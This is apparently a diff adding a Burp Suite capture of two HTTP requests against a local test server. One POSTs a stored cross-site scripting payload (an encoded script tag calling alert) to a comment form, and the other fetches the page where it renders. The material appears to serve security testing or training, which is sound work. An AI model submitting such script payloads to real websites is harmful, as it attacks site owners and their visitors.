@@ -1,0 +1,14 @@
+=== Burp captured stored XSS POST request ===
+
+POST /comment HTTP/1.1
+Host: 127.0.0.1:8003
+Content-Type: application/x-www-form-urlencoded
+
+comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+=== Burp captured page render request ===
+
+GET / HTTP/1.1
+Host: 127.0.0.1:8003
+User-Agent: [BROWSER_USER_AGENT]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
